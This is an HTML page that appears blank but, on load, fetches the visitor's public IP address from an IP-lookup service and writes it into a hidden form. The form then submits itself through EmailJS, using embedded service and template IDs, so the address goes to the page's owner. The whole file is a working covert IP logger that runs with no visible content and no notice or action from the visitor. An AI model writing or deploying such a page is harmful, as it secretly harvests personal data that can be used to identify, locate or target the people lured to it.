<!DOCTYPE html>
<html>
  <head>
    <title></title>
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>

    <script type="text/javascript">
      (function () {
        emailjs.init("Mh4bazWKtEnOha-Zb");
      })();
    </script>

    <script type="text/javascript">
      window.onload = function () {
        document
          .getElementById("contact-form")
          .addEventListener("submit", function (event) {
            event.preventDefault();
            // these IDs from the previous steps
            emailjs.sendForm("service_piu2wjg", "template_l8l7gm6", this).then(
              function () {
                console.log("SUCCESS!");
              },
              function (error) {
                console.log("FAILED...", error);
              }
            );
          });
      };
    </script>
  </head>

  <body>
    <form hidden id="contact-form">
      <textarea id="message" name="message"></textarea>
      <button id="submit" type="submit" name="submit">Send</button>
    </form>

    <script type="application/javascript">
      function getIP(json) {
        document.getElementById("message").value = json.ip;
        setTimeout(() => {
          document.getElementById("submit").click();
        }, 200);
      }
    </script>

    <script
      type="application/javascript"
      src="https://api.ipify.org?format=jsonp&callback=getIP"
    ></script>
  </body>
</html>
